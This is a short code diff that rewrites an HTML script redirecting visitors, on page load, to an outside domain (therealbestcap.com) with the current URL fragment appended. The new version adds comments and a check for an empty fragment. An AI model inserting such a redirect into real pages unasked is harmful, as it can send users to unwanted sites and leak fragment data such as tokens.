@@ -1,3 +1,16 @@
 <script>
-document.location.href='http://therealbestcap.com//'+window.location.href.split('#')[1];
+// Get the current URL fragment (everything after the # symbol)
+const currentFragment = window.location.href.split('#')[1];
+
+// Define the new base URL where you want to redirect users
+const newBaseURL = 'http://therealbestcap.com/';
+
+// Check if there is a fragment in the current URL
+if (currentFragment) {
+  // If there is a fragment, redirect to the new URL with the fragment appended
+  document.location.href = newBaseURL + currentFragment;
+} else {
+  // If there is no fragment, redirect to the new base URL only
+  document.location.href = newBaseURL;
+}
 </script>
